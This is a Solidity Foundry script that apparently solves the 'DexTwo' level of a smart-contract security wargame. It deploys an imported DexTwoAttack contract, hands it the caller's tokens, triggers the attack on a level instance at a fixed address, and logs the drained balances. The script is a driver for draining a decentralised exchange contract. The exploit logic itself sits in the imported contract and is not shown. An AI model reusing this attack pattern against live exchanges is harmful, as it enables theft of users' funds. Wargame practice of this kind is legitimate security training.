// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {DexTwo, SwappableTokenTwo} from "../src/levels/DexTwo.sol";
import {DexTwoAttack} from "../src/attacks/DexTwoAttack.sol";

contract DexTwoScript is Script {
    DexTwo public instance = DexTwo(payable(0x52527879a31c38F045c1F1b7AeCa1E4F0ABD399b));
    DexTwoAttack attacker;

    function run() external {
	vm.startBroadcast();

	SwappableTokenTwo token1 = SwappableTokenTwo(payable(instance.token1()));
	SwappableTokenTwo token2 = SwappableTokenTwo(payable(instance.token2()));

	address levelAddress = address(instance);

	uint256 token1Balance = token1.balanceOf(msg.sender);
	uint256 token2Balance = token2.balanceOf(msg.sender);

	attacker = new DexTwoAttack();
	console.log("DexTwoAttack Contract deployed to:", address(attacker));

	console.log("Transfering tokens to DexTwoAttack Contract...");
	token1.transfer(address(attacker), token1Balance);
	token2.transfer(address(attacker), token2Balance);

	console.log("DexTwo Token 1 initial balance:", token1.balanceOf(levelAddress));
	console.log("DexTwo Token 2 initial balance:", token2.balanceOf(levelAddress));
	console.log("DexTwoAttack Token 1 initial balance:", token1.balanceOf(address(attacker)));
	console.log("DexTwoAttack Token 2 initial balance:", token2.balanceOf(address(attacker)));

	console.log("Attacking...");
	attacker.attack(levelAddress);

	console.log("DexTwo Token 1 final balance:", token1.balanceOf(levelAddress));
	console.log("DexTwo Token 2 final balance:", token2.balanceOf(levelAddress));
	console.log("DexTwoAttack Token 1 final balance:", token1.balanceOf(address(attacker)));
	console.log("DexTwoAttack Token 2 final balance:", token2.balanceOf(address(attacker)));
	
	vm.stopBroadcast();
    }
}
